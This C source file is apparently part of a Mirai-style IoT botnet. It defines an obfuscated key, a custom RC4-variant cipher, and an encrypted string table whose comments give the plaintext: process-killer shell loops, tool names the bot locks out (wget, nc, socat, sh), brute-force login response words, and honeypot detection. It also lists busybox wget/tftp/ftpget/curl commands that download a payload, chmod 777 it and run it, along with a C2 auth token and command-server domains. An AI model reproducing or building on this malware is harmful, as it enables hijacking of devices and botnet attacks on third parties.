#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "dbg.h"
#include "table.h"

table_t *table;

static uint8_t kp_1[] = { 0x24, 0x2f, 0x73, 0xeb, 0x94, 0xc9, 0x64, 0xd7, 0xb7, 0xd1, 0x1d, 0xf3, 0x79, 0x26, 0x52, 0xf9 };
static uint8_t kp_2[] = { 0x7d, 0xce, 0x01, 0x64, 0x95, 0x1a, 0xcd, 0x5e, 0xf4, 0xb4, 0x02, 0xfb, 0x50, 0xcf, 0x4e, 0x75 };
static uint8_t kp_3[] = { 0xfe, 0xc1, 0x60, 0x92, 0x8b, 0xc4, 0x69, 0x42, 0x96, 0x87, 0x35, 0x0f, 0xad, 0x87, 0x09, 0x2b };
static uint8_t kp_4[] = { 0x55, 0x0a, 0x8f, 0xea, 0x24, 0x5c, 0x48, 0x18, 0x11, 0x4b, 0x13, 0x61, 0x1a, 0x62, 0xd6, 0x18 };
static uint8_t kp_5[] = { 0x23, 0x36, 0xab, 0xae, 0xfb, 0x14, 0xf0, 0x91, 0x9b, 0x25, 0xa0, 0x49, 0xac, 0xa9, 0x74, 0x01 };
static uint8_t kp_6[] = { 0xb4, 0x03, 0xeb, 0xd8, 0x5f, 0x34, 0xf1, 0x70, 0x7f, 0x04, 0xd2, 0x99, 0x66, 0xa8, 0xb1, 0x83 };

static uint8_t key[128];

static uint8_t dkey_1[] = {
        0x1e, 0xd3, 0x19, 0xb8, 0x55, 0x5f, 0x06, 0xaa, 0x92, 0x0f, 0x2b, 0xa1, 0xbb, 0x37, 0x58, 0x4d,
        0x59, 0xd8, 0xf5, 0xca, 0x21, 0xc7, 0x37, 0xb3, 0x6b, 0xe1, 0x04, 0xdc, 0xb8, 0x79, 0x7d, 0xd7,
        0x4d, 0x97, 0x8f, 0xa2, 0xf6, 0x95, 0x4d, 0x88, 0xa4, 0x78, 0x29, 0x60, 0xb0, 0x81, 0xad, 0x09,
        0x59, 0xa2, 0xd3, 0x7a, 0x69, 0x0a, 0x2e, 0xd5, 0xeb, 0x32, 0xb1, 0xa3, 0xab, 0x2f, 0x7a, 0xf8,
        0xc6, 0x09, 0x9b, 0xbc, 0x9f, 0xe8, 0x44, 0x43, 0x60, 0x6d, 0xa3, 0x10, 0xee, 0x50, 0x19, 0x47,
        0xf2, 0xec, 0xc1, 0x5c, 0xf6, 0xef, 0x31, 0xe1, 0x21, 0xe2, 0x85, 0xcd, 0x11, 0xff, 0xc5, 0xd7,
        0x09, 0x60, 0x93, 0xa8, 0x48, 0xd7, 0xeb, 0xa9, 0x44, 0x8f, 0xb9, 0x32, 0xdf, 0xd3, 0x79, 0xd2,
        0xbf, 0x3b, 0x2e, 0xb6, 0x2a, 0x5f, 0x97, 0x4c, 0x41, 0x1c, 0x19, 0x53, 0x1c, 0xde, 0x2a, 0x25,
        0x3f, 0xbe, 0xcd, 0x87, 0x95, 0xb8, 0x30, 0xda, 0x47, 0xea, 0x0c, 0x27, 0xbd, 0x86, 0xf9, 0x7c,
        0xc1, 0x27, 0x32, 0xeb, 0x86, 0xca, 0x37, 0xc7, 0xe6, 0x50, 0x1a, 0x02, 0x2f, 0x45, 0x27, 0x6e,
        0x03, 0xf4, 0xf5, 0x98, 0xad, 0x26, 0x72, 0xf4, 0x10, 0x7f, 0x1b, 0xcd, 0x05, 0x14, 0x49, 0xc6,
        0x3b, 0x7c, 0xb1, 0xc1, 0x46, 0xe9, 0x89, 0x2c, 0x39, 0xa3, 0x2f, 0x68, 0xe8, 0x56, 0xd6, 0xeb,
        0x4b, 0xcc, 0x84, 0xf8, 0xf2, 0xf6, 0xec, 0x02, 0x75, 0x08, 0xcf, 0x7a, 0x1c, 0x18, 0x40, 0x58,
        0x94, 0xf2, 0x19, 0xda, 0xdb, 0xa2, 0x07, 0x14, 0x46, 0x36, 0x7d, 0x2e, 0x8c, 0x53, 0x1a, 0xd7,
        0x1f, 0x9e, 0xcf, 0x11, 0x94, 0xbc, 0x13, 0x0a, 0xc4, 0xe2, 0x84, 0xe0, 0xfb, 0xc5, 0x38, 0x8f,
        0xb7, 0x52, 0x6a, 0x92, 0xf4, 0x71, 0xa6, 0x3a, 0xa7, 0x23, 0x69, 0x33, 0x77, 0x83, 0x0b, 0x92
};

static uint8_t dkey_2[] = {
        0xbc, 0xda, 0x50, 0x8a, 0xa2, 0x87, 0x6b, 0x39, 0x5e, 0x2e, 0x7f, 0x3d, 0x3d, 0xa5, 0xd7, 0x82,
        0x12, 0x5b, 0xcb, 0xcf, 0x23, 0x58, 0xc4, 0x6c, 0xd0, 0xda, 0x79, 0x11, 0xc6, 0x89, 0x90, 0x83,
        0x64, 0xe0, 0x0d, 0x06, 0x67, 0x79, 0x3f, 0xc6, 0xa7, 0xbf, 0x03, 0xe4, 0x64, 0xda, 0x66, 0x77,
        0x35, 0x31, 0x46, 0x58, 0x8a, 0x0a, 0xc5, 0x5a, 0xe5, 0x3e, 0x6b, 0xab, 0xc7, 0xfb, 0x2e, 0x2b,
        0xdc, 0x3c, 0x32, 0x43, 0xb5, 0x71, 0x09, 0x5c, 0x30, 0x0c, 0x41, 0x95, 0xe6, 0xa7, 0x0c, 0x1c,
        0xd9, 0x52, 0x74, 0x63, 0x5c, 0x39, 0xbd, 0x41, 0x77, 0x29, 0xed, 0x3f, 0x24, 0x1b, 0x6a, 0x00,
        0x57, 0x9c, 0x44, 0x0c, 0x0e, 0x4d, 0x69, 0x3e, 0x5a, 0xaa, 0xd3, 0x40, 0x51, 0xdf, 0x5c, 0x2a,
        0x31, 0xd1, 0x8d, 0x8e, 0x0a, 0x4b, 0xcf, 0x82, 0x74, 0xbc, 0xc1, 0x98, 0xd8, 0x2b, 0x99, 0x2f,
        0xc8, 0xdd, 0x3c, 0xd6, 0x2a, 0xa5, 0x14, 0x84, 0x4f, 0xe8, 0xc5, 0xa0, 0xc7, 0x21, 0xcb, 0xf9,
        0xf2, 0x58, 0x87, 0xfd, 0xa3, 0x56, 0x7f, 0x17, 0x13, 0x40, 0xb0, 0xeb, 0x6b, 0x49, 0x1a, 0x33,
        0x26, 0x56, 0x09, 0x50, 0xfb, 0x1e, 0xd5, 0x4a, 0x06, 0x9a, 0xeb, 0xcd, 0xbb, 0xb6, 0xc6, 0xae,
        0x0e, 0x4d, 0xab, 0xb2, 0xa4, 0x2a, 0xc9, 0xb7, 0x6a, 0x79, 0xa2, 0xd5, 0xc2, 0xbc, 0x09, 0xe8,
        0x13, 0x12, 0x39, 0x0e, 0x30, 0x0e, 0x59, 0x36, 0xa8, 0x44, 0x04, 0x63, 0xfa, 0xca, 0x11, 0x08,
        0x18, 0xbc, 0xba, 0xbc, 0xe6, 0x84, 0x73, 0x50, 0xfd, 0x15, 0x26, 0xc0, 0xd1, 0x2f, 0xa8, 0xe4,
        0x41, 0xe1, 0xf3, 0x72, 0xef, 0x4c, 0xa8, 0x97, 0x90, 0xac, 0xfb, 0x8a, 0x77, 0x0c, 0x92, 0x8f,
        0xc9, 0x4d, 0x4b, 0xaf, 0xd1, 0xbe, 0x00, 0xce, 0xd3, 0x26, 0x8e, 0xa4, 0x55, 0x37, 0x89, 0x96
};

void key_build() {

    static uint8_t *k_segs[6];
    uint8_t *k_ptr = key;

    k_segs[0] = (uint8_t*)((uintptr_t)kp_1 ^ 0x12345678);
    k_segs[1] = (uint8_t*)((uintptr_t)kp_2 ^ 0x12345678);
    k_segs[2] = (uint8_t*)((uintptr_t)kp_3 ^ 0x12345678);
    k_segs[3] = (uint8_t*)((uintptr_t)kp_4 ^ 0x12345678);
    k_segs[4] = (uint8_t*)((uintptr_t)kp_5 ^ 0x12345678);
    k_segs[5] = (uint8_t*)((uintptr_t)kp_6 ^ 0x12345678);

    for (size_t i = 0; i < 6; i++) {

        uint8_t *segment = (uint8_t*)((uintptr_t)k_segs[i] ^ 0x12345678);
        memcpy(k_ptr, segment, 16);

        k_ptr += 16;
    }
}

void swap(uint8_t *a, uint8_t *b) {

    *a ^= *b;
    *b ^= *a;
    *a ^= *b;
}

uint8_t mtpaes(uint8_t a, uint8_t b) {

    uint8_t p = 0;
    uint8_t hbit;
    
    for (int i = 0; i < 8; i++) {

        if (b & 1) {
            p ^= a;
        
        }

        hbit = a & 0x80;
        a <<= 1;

        if (hbit) {
            a ^= 0x1b;

        }
        b >>= 1;
    }
    return p;
}

void rc4(char *str, int len) {

    key_build();         // combine our key-bytes

    uint8_t s[256], s1[256], s2[256];   //  init our real / dummy state arrs
    int i = 0, j = 0, dj1 = 0, dj2 = 0;

    for (i = 0; i < 256; i++) {
    
        s[i] = i;
        s1[i] = i;
        s2[i] = i;
    }

    for (i = 0; i < 256; i++) {             // real
    
        j = (j + s[i] + key[i % sizeof(key)]) % 256;
        swap(&s[i], &s[j]);
    }

    for (i = 0; i < 256; i++) {             // fake KSA 1
    
        dj1 = (dj1 + s1[i] + dkey_1[i % 256]) % 256;
        swap(&s1[i], &s1[dj1]); 
    }

    for (i = 0; i < 256; i++) {             // fake KSA 2
    
        dj2 = (dj2 + s2[i] + dkey_2[i % 256]) % 256;
        swap(&s2[i], &s2[dj2]); 
    }

    srand((unsigned int)(key[0] + key[sizeof(key) - 1] + len));
    
    uint8_t offs_1 = rand() % 256;
    uint8_t offs_2 = rand() % 256;
    uint8_t offs_3 = rand() % 256;

    i = 0, j = 0;

    for (int k = 0; k < len; k++) {
    
        i = (i + 17) % 256;
        j = (j + s[i] + (s[(i + j) % 256] ^ offs_1)) % 256;

        s[i] = (s[i] << 3) | (s[i] >> 5);
        s[j] = (s[j] << 5) | (s[j] >> 3);

        uint8_t b_keystm = s[(s[i] + s[j]) % 256];
        b_keystm = (b_keystm << 2) | (b_keystm >> 6);

        b_keystm ^= (s[(i * j) % 256] >> 2);
        
        b_keystm &= 0xF0;
        b_keystm |= 0x0F;

        b_keystm += offs_2;
        b_keystm ^= offs_3;

        str[k] ^= b_keystm;

        if (k % 3 == 0) {
        
            uint8_t fke = s[(k * 3) % 256];
            swap(&s[fke], &s[i]);
        }

        if (k % 2 == 0) {      //lil random
        
            for (int i = 0; i < 4; i++) {
            
                uint8_t a = s[i];
                uint8_t b = s[(i + 1) % 256];
                uint8_t c = s[(i + 2) % 256];
                uint8_t d = s[(i + 3) % 256];

                s[i] = mtpaes(a, 0x0e) ^ mtpaes(b, 0x0b) ^ mtpaes(c, 0x0d) ^ mtpaes(d, 0x09);
                s[(i + 1) % 256] = mtpaes(a, 0x09) ^ mtpaes(b, 0x0e) ^ mtpaes(c, 0x0b) ^ mtpaes(d, 0x0d);
                s[(i + 2) % 256] = mtpaes(a, 0x0d) ^ mtpaes(b, 0x09) ^ mtpaes(c, 0x0e) ^ mtpaes(d, 0x0b);
                s[(i + 3) % 256] = mtpaes(a, 0x0b) ^ mtpaes(b, 0x0d) ^ mtpaes(c, 0x09) ^ mtpaes(d, 0x0e);
            }
        }

        for (int m = 0; m < 5; m++) {       //  confusion
        
            uint8_t ntuse = offs_1 ^ offs_2;
            ntuse ^= offs_3;
        }
    }

    str[len] = 0;
}

void table_unlock_val(uint8_t id) {

    rc4(table[id].str, table[id].len);
}

void table_lock_val(uint8_t id) {

    rc4(table[id].str, table[id].len);
}

static void add_entry(uint8_t id, char *str, int len) {

    table = realloc(table, (id + 1) * sizeof(table_t));

    table[id].str = calloc(len + 1, sizeof(char));
    memcpy(table[id].str, str, len);

    table[id].len = len;

#ifdef DEBUG_TABLE
    table_unlock_val(id);
    DEBUG_PRINT("table[%d].str: (\"%s\") | table[%d].len: (\'%d\')\n", id, table[id].str, id, table[id].len);
    table_lock_val(id);
#endif
}

void table_init(void) {

    // ensure
    add_entry(TABLE_ENSURE_TCP, "\xA0\x0F\x2D\x30\x6C\x30\xD1\xEA\xCB\x40\xBB\x0C\x7F", 13); /* "/proc/net/tcp" */
    add_entry(TABLE_ENSURE_SOCKET, "\xE1\x9D\x41\xF9\x07\xC6\xD8\x29", 8); /* "socket:[" */

    // main
    add_entry(TABLE_PROCESS_NAME, "\xDF", 1); /* "\0" */

    // hide
    add_entry(TABLE_HIDE_FILE, "\x28\xD7\x85\xF8\x54\x58\xA6", 7); /* "/proc/1" */
    add_entry(TABLE_HIDE_SELF, "\x2B\x64\x16\x3B\xF7\x2B\x47\xA1\xC8\x32", 10); /* "/proc/self" */

    // killer
    add_entry(TABLE_KILLER_MOUNTS, "\xE3\x5C\x7E\x43\x9F\x83\xA1\x13\x29\x32\xC8\xEF", 12); /* "/proc/mounts" */
    add_entry(TABLE_KILLER_PROC, "\x2D\x62\x60\x2D\x41\x4D", 6); /* "/proc/" */
    add_entry(TABLE_KILLER_SELF, "\xD4\x0B\x59\xF4\xF8\x04\x58\x6E\x37\xDD\x44\xDE\x63\x2E", 14); /* "/proc/self/exe" */
    add_entry(TABLE_KILLER_EXE, "\xC2\xE8\x05\x28", 4); /* "/exe" */
    add_entry(TABLE_KILLER_SO, "\x2A\x67\xAB", 3); /* ".so" */
    add_entry(TABLE_KILLER_STDIN, "\x12\x6B\x99\x02\x8D", 5); /* "/fd/0" */
    add_entry(TABLE_KILLER_NULL, "\x6E\x95\x44\x47\xDE\xFF\xF4\x3D\x6D", 9); /* "/dev/null" */
    add_entry(TABLE_KILLER_CONSOLE, "\xE3\x48\x69\x5A\xD3\xCF\xA3\x12\x2F\x33\xD0\xF9", 12); /* "/dev/console" */
    add_entry(TABLE_KILLER_MAPS, "\x12\x60\x9C\x5D\xCE", 5); /* "/maps" */

    // locker
    add_entry(TABLE_LOCKER_CMDLINE, "\xBD\x91\x4F\xF6\x0E\xDB\x8C\x17", 8); /* "/cmdline" */
    add_entry(TABLE_LOCKER_WGET, "\x9A\xEA\x18\x39", 4); /* "wget" */
    add_entry(TABLE_LOCKER_FTP, "\x62\x60\xB4", 3); /* "ftp" */
    add_entry(TABLE_LOCKER_CURL, "\x8E\xF8\x0F\x21", 4); /* "curl" */
    add_entry(TABLE_LOCKER_ECHO, "\x88\xEE\x15\x22", 4); /* "echo" */
    add_entry(TABLE_LOCKER_MOUNT, "\x50\x62\x88\x43\xC9", 5); /* "mount" */
    add_entry(TABLE_LOCKER_SOCAT, "\x4E\x62\x9E\x4C\xC9", 5); /* "socat" */
    add_entry(TABLE_LOCKER_NC, "\x6A\x77\xC4", 3); /* "nc\0" */
    add_entry(TABLE_LOCKER_SH, "\x77\x7C\xC4", 3); /* "sh\0" */
    add_entry(TABLE_LOCKER_LOGIN, "\x6E\x7D\x75\x2B\x4C\x62", 6); /* "login\0" */
    add_entry(TABLE_LOCKER_STATUS, "\x28\xD4\x83\xF6\x43\x02\xE4", 7); /* "/status" */
    add_entry(TABLE_LOCKER_PPID, "\x4D\x7D\x94\x49\x87", 5); /* "ppid:" */

    // scanner
    add_entry(TABLE_INCORRECT, "\x28\x9F\x42\x5E\x83\xE3\xE4\x32\x75", 9); /* "incorrect" */
    add_entry(TABLE_INVALID, "\x6E\xC9\x81\xF6\x5B\x1E\xF3", 7); /* "invalid" */
    add_entry(TABLE_BAD, "\x66\x75\xA0", 3); /* "bad" */
    add_entry(TABLE_WRONG, "\x4A\x7F\x92\x43\xDA", 5); /* "wrong" */
    add_entry(TABLE_FAIL, "\x8B\xEC\x14\x21", 4); /* "fail" */
    add_entry(TABLE_DENIED, "\x66\x77\x7C\x2B\x47\x06", 6); /* "denied" */
    add_entry(TABLE_ERROR, "\x58\x7F\x8F\x42\xCF", 5); /* "error" */
    add_entry(TABLE_RETRY, "\x4F\x68\x89\x5F\xC4", 5); /* "retry" */

    add_entry(TABLE_ENABLE, "\x67\x7C\x73\x20\x4E\x07", 6); /* "enable" */
    add_entry(TABLE_SYSTEM, "\x71\x6B\x61\x36\x47\x0F", 6); /* "system" */
    add_entry(TABLE_SHELL, "\x4E\x65\x98\x41\xD1", 5); /* "shell" */
    add_entry(TABLE_SH, "\x7C\xA7", 2); /* "sh" */
    add_entry(TABLE_LINUXSHELL, "\x68\x7D\x0A\x21\xEC\x77\x5C\xA1\xC8\x38", 10); /* "linuxshell" */
    add_entry(TABLE_PINGSH, "\xE2\x9B\x4C\xF5\x42\x89\x91\x1A", 8); /* "ping ;sh" */

    add_entry(TABLE_BUSYBOX, "\xE3\x4E\x65\x42\xD3\xCE\xB9\x0F\x25\x3E\xD3\xE4", 12); /* "/bin/busybox" */
    add_entry(TABLE_BUSYBOX_RESP, "\x8E\x08\x4A\xFC\xFE\x11\x0B\x69\x2E\xC8\x12\xD9\x74\x33", 14); /* "usage: busybox" */

    add_entry(TABLE_HONEYPOT, "\x85\xD2\x36\x09\xF6\xB4\xE9\xD5\xA6\x40\xD0\xD6\xB5\x77\xA2\x66\xD5\xD3\xBA\xF0\x19\x55\xDB\x82\x5A\xDF\x18\x93", 28); /* "cd /proc && cat self/cmdline" */
    add_entry(TABLE_HONEYPOT_RESP, "\x7F\x0D\x98\x9C\x4F\xC9\x90\xEA\x03\x9F\xD1\xF8\xB0\xC5\xE2\xA9", 16); /* "cat\0self/cmdline" */

    add_entry(TABLE_KILL_REALPATH, "\xE9\x40\x4D\x9F\x1F\xA6\x8B\x7F\xC6\x51\xEF\x90\xFF\x9D\x60\x4C\xB0\xF4\x6F\x22\xB6\xD2\xA5\x84\x7F\xBB\x20\x2F\xEC\xEE\x9C\xFA\xFF\xEB\xB7\xF3\xCC\x1F\x42\x73\x4F\x1B\x8F\xE6\xFB\x90\xEA\x37\x6A\x16\x1F\x46\xE1\x0F\x95\xE8\x07\x5B\x2A\x63\x5A\x2B\x6A\xAB\x66\x98\x75\x43\x15\x48\x60\x71\x68\x35\x26\x9F\xD4\xE6\xD3\xC3\xEF\xF2\x86\x1F\xEB\x14\x5F\x06\x8B\x6C\xCC\xC5\xC0\x22\xAF\xD4\x54\xDF\x5A\x2C\x1E\xBC\xC4\x9F\x8B\x30\xD1\x5A", 108); // "for pid in /proc/[0-9]*; do case $(ls -l $pid/exe) in *'(deleted)'*|*'/.'*) kill -9 ${pid##*/} ;; esac; done"
    add_entry(TABLE_KILL_MOUNTS, "\x2A\x45\x64\x61\xB8\xED\x1F\x38\x0C\x59\xBD\x10\xAF\x2D\xF1\x64\x43\xD8\x16\x0D\xD9\x92\x9D\x7E\x4C\x5E\x68\xDD\xE9\xC1\x64\x13\x38\x6D\xA4\x53\xBD\xD7\x8F\xD2\x7D\xBF\x12\x9E\xA2\x1F\x67\x24\x4D\xDD\x34\xB9\xF0\x09\x36\x71\xC4\x43\x88\x7E\xFE\x77\x52\xFD\xCF\x12\x7E\x82\x10\x86\xDD\x86\x54\xF1\xF1\x7D\x30\x44\xED\xE9\x66\x5D\x24\x19\x78\x88\x8D\xC7\x80\x46\x9D\xE6\x56\x7D\xF8\x6E\xAC\x5E\xF6\x9D\xF9\xB2\xE3\xA8\xDD\x81\x1D\xA2\xED\x7F\x92\x5E\x92\xB0\x72\xB8\xF3\xB9\x9E", 119); // "while read -r line; do case $line in *\"/proc/\"*) pid=${line##*/proc/}; kill -9 ${pid%% *}; ;; esac; done < /proc/mounts"

    add_entry(TABLE_DIR_CHMOD, "\xEC\x6C\x4A\x7A\x3C\x3F\x74\x91\xB3\xB8\x6C\xDB\xBB\xBB\x5C", 15); /* "0 && chmod 777 " */
    add_entry(TABLE_DIR_CD, "\xA2\xD2\x04\xB4\x42\xD1\x86\x52", 8); /* "0 && cd " */

    add_entry(TABLE_WGET, "\x02\xEF\xF4\x73\x62\x8F\xB8\x0E\x74\xFF\x82\x65\x0D\xBA\xCA\xE8\x49\x2D\x15\xD9\x59\x5D\x17\x32\x52", 25); /* "/bin/busybox wget http://" */
    add_entry(TABLE_WGET_RUN, "\x03\x2B\x4B\x19\x48\x42\x7F\x84\x0C\x11\xB3\x9C\x71\xC2\x4C\x0B\x9B\x59\xA8\xB7\x9F\x24\x91\xB3\xE8\x6C\x0B\x5B\x8B\x7C\x5B\x2B\x29\x18\xD7\x02\x43\x0B\x1B\x49\xA8", 41); /* "/wget.sh -O -> wget;chmod 777 wget;./wget" */

    add_entry(TABLE_TFTP, "\x7B\xC6\x4D\x6A\x6B\xA6\x51\xD7\xAD\x86\x4B\xAC\x64\x50\xD2\x20\xA4\x84\xC9\x03\x84", 21); /* "/bin/busybox tftp -g " */
    add_entry(TABLE_TFTP_RUN, "\x00\x4D\xE2\x40\x24\x16\x34\x00\x2E\xA3\x58\x20\x4D\x2C\xC0\xAD\x1E\x40\x94\x06\xE4\x10\x1B\x13\xA8\x5D\x8F\x84\x40\xB7\x47\x37\x70\x24\x46\xA4\xB0\xDB\x3E\x0F\xF4\x06\x74\x30", 44); /* " -r tftp.sh -l -> tftp;chmod 777 tftp;./tftp" */

    add_entry(TABLE_FTPGET, "\xFF\x52\xD9\x2E\xAF\xB2\xF5\x53\xB9\x72\xBF\xC8\x10\xD6\xB4\x70\x67\x95\x44\x30", 20); /* "/bin/busybox ftpget " */
    add_entry(TABLE_FTPGET_RUN, "\xD1\xF7\x05\x91\x76\xD4\xA5\x61\x27\x65\x51\x66\x24\xC5\xAF\x22\xD9\x3A\xD2\xA9\x8C\x5E\x95\x11\x96\x56\xA6\x21\xC7\x75\xC1\x66\x44\x15\xFA\xFF\xEE\x97\x65\x51\xA6\xA4\xC5", 43); /* " ftpget ftpget.sh;chmod 777 ftpget;./ftpget" */

    add_entry(TABLE_CURL, "\xAF\x59\x7E\x40\xDC\xC4\xB8\x08\x2C\x66\x93\xB3", 12); /* "curl http://" */
    add_entry(TABLE_CURL_RUN, "\x03\x3F\x59\x0E\x50\x42\x7F\x84\x0C\x11\x93\x9C\x71\xC2\x4C\x1F\x89\x4E\xB0\xB7\x9F\x24\x91\xB3\xE8\x6C\x0B\x5B\x8B\x7C\x4F\x39\x3E\x00\xD7\x02\x43\x1F\x09\x5E\xB0", 41); /* "/curl.sh -o -> curl;chmod 777 curl;./curl" */

    // connection
    add_entry(TABLE_AUTH_TOKEN, "\xB8\x63\x1B\x0D\x8B\x1E\x1A\xFA\xF8\xF0\xCA\x1B\xAE\x24\x53\x88\xCD\xF7\x5B\x4A\xFF\xA9\x1B\xCA\xBC\x3D\xCA\x26\xAE\xEB\x35\x91", 32); /* "azbd27sc1ycbgmz1dn2sf02c5tcow2lh" */
    add_entry(TABLE_RECV_PING, "\x31\xF1", 2); /* ">>" */
    add_entry(TABLE_SEND_PONG, "\x33\xF3", 2); /* "<<" */

    // domains
    add_entry(TABLE_REG_DOMAIN, "\x05\xE9\xE8\x22\xB8\xA2\x90\x35\x6E\x2C\x10\xC8\x1F\xAF\x7F\x04\x95", 17); /* "thisisadomain.net" */
    add_entry(TABLE_REG_DOMAIN2, "\x2E\xAF\xF1\x38\xB2\xBA\x9D\x34\x73\x28\x12\xCA\x5F\xEF\x70\x0C\x84", 17); // "_.picklerick.name"
    add_entry(TABLE_OPENNIC_DOMAIN, "\xEB\x10\x32\x3E\x66\x71\x91\xFF\xDE\x1D\xA0\x0B\x76", 13); /* "domain.parody" */
    add_entry(TABLE_OPENNIC_DOMAIN2, "\xB3\x3E\x05\x3B\x75\x32\x7D\x90\xF2\xBB\x23\x9C\xE4\xE9\x0E", 15); /* "original.gopher" */
    add_entry(TABLE_BINS_DOMAIN, "\x20\xC8\x57\x2A\x30\xAC\x4D\xD7\xBD\x97\x45\xB0\x2B\x49\xD5\x3D\xBA\x8A\x8A\x01\xD0", 21); /* "tls.thisisadomain.net" */

    // opennic dns server resolving
    add_entry(TABLE_OPENNIC_RESOLVE, "\x1C\x8E\xAF\x4B\x04\x6C\xCE\x04\x82\xFB\x44\x14\x39\xBE\x38\x36\x39\xBB\x2D\x99\x3B\x33\xBF\x9F\x2B\xA4\xFA\xE5\x4A\x06\x51\x63\xF4\x58\x7F\x91\xBB\x6A\x55\x9A\x95\x0A\xB5\x1A\x66\xF1\x38\xC4\x75\x15\xEE\x88\x0F\x62\xF4\xB5\x31\x4B\x38\xA7\x44\x28\x7E\x66\x41\xE6\xE1", 67); /* "GET /geoip/?res=20&r HTTP/1.1\r\nHost: 1.1.1.1\r\nConnection: Close\r\n\r\n" */
    
    // hik domination
    add_entry(TABLE_HIK_DIR1, "\x12\x65\x92\x40\xD8", 5); /* "/home" */
    add_entry(TABLE_HIK_DIR2, "\xC2\xE9\x18\x3B", 4); /* "/dev" */
    add_entry(TABLE_HIK_DIR3, "\xC2\xFB\x1C\x3F", 4); /* "/var" */
    
}
